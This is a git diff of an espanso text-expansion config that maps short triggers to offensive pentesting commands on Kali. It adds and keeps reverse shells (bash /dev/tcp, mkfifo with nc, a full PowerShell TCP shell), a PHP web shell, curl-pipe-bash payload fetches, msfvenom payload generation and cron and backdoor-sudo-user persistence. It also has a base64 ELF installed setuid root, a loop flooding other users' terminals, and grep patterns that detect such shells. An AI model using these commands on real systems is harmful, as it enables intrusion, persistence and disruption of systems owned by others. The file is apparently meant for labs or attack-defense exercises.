@@ -8,17 +8,26 @@ global_vars:
   - name: "IP"
     type: "shell"
     params:
-      cmd: ip -o -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ip -o -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
+      cmd: "ip a | grep -q tun0 && hostname -I | awk '{print $(NF-0)}' || hostname -I | awk '{print $1}'"
 
   - name: "ssh_key"
     type: "shell"
     params:
       cmd: "cat /home/kali/.ssh/id_rsa.pub"
+      
+    # sudo apt install xclip -y
+  - name: "clipboard"
+    type: "shell"
+    params:
+      cmd: "xclip -o"
 
 matches:
 # QOL
   - trigger: ":ip"
     replace: "{{IP}}"
+
+  - trigger: ":clipboard"
+    replace: "{{clipboard}}"
                   
 # SETUP AND NMAP              
   - trigger: ":setup"                  
@@ -32,6 +41,7 @@ matches:
       msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . & 
+      msfvenom -p windows/powershell_reverse_tcp LHOST={{IP}} LPORT=22 -f psh
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
@@ -47,58 +57,68 @@ matches:
       python3 -m http.server 80
 
   - trigger: ":msfwin"
-    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell.exe
 
   - trigger: ":msfmwin"
-    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=443 -f exe -o shell.exe LHOST=
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell.exe
 
-  - trigger: ":msflin"
-    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
-
-  - trigger: ":msfmlin"
-    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
-
-  - trigger: ":smb"
+  - trigger: ":smbserver"
     replace: "impacket-smbserver -smb2support share ."
 
   - trigger: ":pyserver"
-    replace: "python3 -m http.server"
-  
-  - trigger: ":phpserver"
-    replace: "php -S 0.0.0.0:"
+    replace: "python3 -m http.server 80"
                                                                                 
   - trigger: ":responder"
     replace: "sudo responder -I tun0"
-                                                                                
+    
   - trigger: ":nc"
-    replace: nc -nvlp 443
+    replace: nc -nvlp 22
+
 # ENUMERATION
   - trigger: ":nmap"
-    replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
+    replace: sudo nmap -p- -sC -sV -v -Pn --min-rate 10000 -p- {{clipboard}}
 
-  - trigger: ":lping"
-    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+  - trigger: ":ping"
+    replace: for i in {1..254} ;do (ping -c 1 {{clipboard}}$i | grep "bytes from" &) ;done
 
   - trigger: ":wping"
-    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
-
+    replace: for /L %i in (1 1 254) do ping {{clipboard}}%i -n 1 -w 100 | find "Reply"
+    
+  
   - trigger: ":dirsearch"
     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "
 
+  - trigger: ":gobuster"
+    replace: "gobuster dir -u http://{{clipboard}} -w /usr/share/wordlists/dirb/common.txt -e php,txt,html"
+
 # REVERSE SHELLS                                                                
-  # LINUX                                                                       
+  # LINUX
+  - trigger: ":rbash"
+    replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"
+
+  - trigger: ":rphp"
+    replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
+  
+  - trigger: ":wphp"
+    replace: <?php echo shell_exec($_GET['cmd']); ?>
+    
   - trigger: ":rcurl"                                                           
     replace: curl http://{{IP}}/shell.sh | bash
                                                                                 
-  - trigger: ":rwget"
+  - trigger: ":rwget"                                                           
     replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
-    
-  - trigger: ":rbash"
-    replace: bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'
 
-  - trigger: ":mkfifo"
-    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
+  - trigger: ":mkfifo"                                                          
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
     
+# WINDOWS
+  - trigger: ":rpowershell"
+    replace: |
+      $LHOST = "{{IP}}"; $LPORT = 22; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
+
+  - trigger: ":xfreerdp"
+    replace: "xfreerdp /dynamic-resolution /cert-ignore /compression /auto-reconnect /u:user /p:pass /v:{{clipboard}}"
+
 # POST
   - trigger: ":pty"
     replace: |
@@ -119,15 +139,34 @@ matches:
     replace: |
       mkdir -p ~/.ssh
       echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+
+  - trigger: ":sshpersist"
+    replace: |
+      "sudo useradd -m <username> && echo "<username>:<password>" | sudo chpasswd && echo '<username> ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"
+
+      
   - trigger: ":cronpersist"
-    replace: (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'") | crontab -
-  
+    replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -
+
+  - trigger: ":fileprivesc"
+    replace: echo "f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAAIAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F" | base64 -d >> /tmp/tmp && sudo chown root:root /tmp/tmp && sudo chmod +sx /tmp/tmp
+
   - trigger: ":wget"
     replace: wget http://{{IP}}/
+
+  - trigger: ":curl"                                                           
+    replace: curl http://{{IP}}/
     
   - trigger: ":certutil"
     replace: certutil.exe -urlcache -split -f http://{{IP}}/
-  
+
+  - trigger: ":iwr"
+    replace: iwr -uri http://{{IP}}/ -Outfile
+
+# SSH Tunneling
+  - trigger: ":sshuttle"
+    replace: sshuttle -r user@{{clipboard}} 10.10.10.0/24 —ssh-cmd “ssh -i id_rsa”
+    
   - trigger: ":pligolo"
     replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:443
 
@@ -142,6 +181,50 @@ matches:
   - trigger: ":suid"
     replace: find / -perm -u=s -type f 2>/dev/null
 
-  - trigger: ":root"
-    replace: |
-      wget http://{{IP}}/PwnKit && chmod +x PwnKit && ./PwnKit
+  - trigger: ":train"
+    replace: sl > /dev/pts/
+    
+  - trigger: ":ptspam"
+    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done
+
+# DEFENSE
+
+  - trigger: ":ps"
+    replace: ps aux | grep -E "nc|netcat|bash -i|/bin/sh|python|perl|ruby|wget|curl|bash"
+
+  - trigger: ":kill"
+    replace: kill -9 
+
+  - trigger: ":pkill"
+    replace: pkill -9 -t pts/
+
+# Persist Check
+
+  - trigger: ":users"
+    replace: cat /etc/passwd | grep /*sh
+
+  - trigger: ":sshconfig"
+    replace: cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|AllowUsers|PasswordAuthentication|PermitEmptyPasswords|PubkeyAuthentication" && echo -e "NO NO YES NO\nIF HARDENING RESTART SSH\nsudo systemctl restart sshd"
+
+  - trigger: ":ftpconfig"
+    replace: cat /etc/vsftpd.conf | grep -v '^\s*#' | tr -s '\n' && echo -e "\nanonymous_enable NEEDS TO BE NO\nRestart vsftpd after hardening\nsudo systemctl restart vsftpd"
+
+  - trigger: ":cron"
+    replace: echo "" && sudo find /etc/cron* -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; && sudo find /var/spool/cron/crontabs -type f -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|nc|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \; | grep -v '^\s*#'
+
+  - trigger: ":bashrc"
+    replace: echo "" && sudo find / -name '*bashrc' -exec grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}|netcat|bash -i|/bin/bash|python|perl|ruby|wget|curl' {} \; -exec stat -c "%A %y %n" {} \;
+
+# WIFI
+
+  - trigger: ":airup"
+    replace: sudo airmon-ng start wlan0
+
+  - trigger: ":airodump"
+    replace: sudo airodump-ng wlan0mon -w ~/wifi/scan --manufacturer --wps --band abg
+
+  - trigger: ":hostname"
+    replace: hostnamectl set-hostname
+
+  - trigger: ":spoofmac"
+    replace: macchanger -A wlan0mon
